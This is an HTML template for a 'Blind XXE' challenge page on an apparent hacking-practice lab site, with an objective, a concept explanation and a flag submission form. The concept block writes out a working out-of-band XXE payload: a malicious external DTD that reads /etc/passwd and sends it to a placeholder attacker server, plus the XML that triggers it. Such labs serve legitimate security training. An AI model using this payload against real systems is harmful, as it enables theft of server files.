<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title><%= title %> - EliteHackLab</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"></head>
<body>
  <div class="matrix-bg"></div>
  <nav class="main-nav"><div class="nav-brand"><span class="brand-icon">💀</span><span class="brand-text">Elite<span class="highlight">Hack</span>Lab</span></div><div class="nav-links"><a href="/"><i class="fas fa-home"></i> Dashboard</a></div></nav>
  <div class="lab-container">
    <div class="lab-header"><h1>📄 Blind XXE</h1><div class="lab-info"><span class="lab-tag difficulty-hard">Hard</span></div></div>
    <div class="lab-section">
      <h2><i class="fas fa-crosshairs"></i> Objective</h2>
      <p>The server parses XML but doesn't reflect entity content in the response. Use out-of-band (OOB) techniques with an external DTD to exfiltrate data.</p>
    </div>
    <div class="lab-section">
      <h2><i class="fas fa-terminal"></i> Concept</h2>
      <div class="code-block">Blind XXE with OOB exfiltration:

1. Host a malicious DTD on your server (evil.dtd):
&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://YOUR_SERVER/?data=%file;'&gt;"&gt;
%eval;
%exfil;

2. Send XML payload:
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY % xxe SYSTEM "http://YOUR_SERVER/evil.dtd"&gt;
  %xxe;
]&gt;
&lt;data&gt;test&lt;/data&gt;

3. Check your server logs for the exfiltrated data!</div>
      <div class="hint-box"><i class="fas fa-lightbulb"></i> Use a service like webhook.site or Burp Collaborator to receive OOB data</div>
    </div>
    <div class="flag-submit"><h3><i class="fas fa-flag"></i> Capture The Flag</h3>
      <form onsubmit="submitFlagInline('xxe-basic','flagInput_xxe2','flagResult_xxe2'); return false;" style="display:flex; gap:0.5rem; max-width:500px; margin:0 auto;"><input type="text" id="flagInput_xxe2" placeholder="FLAG{...}" autocomplete="off"><button type="submit" class="btn">Submit</button></form>
      <div id="flagResult_xxe2" style="display:none; margin-top:1rem;"></div>
    </div>
  </div>
  <script src="/js/main.js"></script>
</body>
</html>
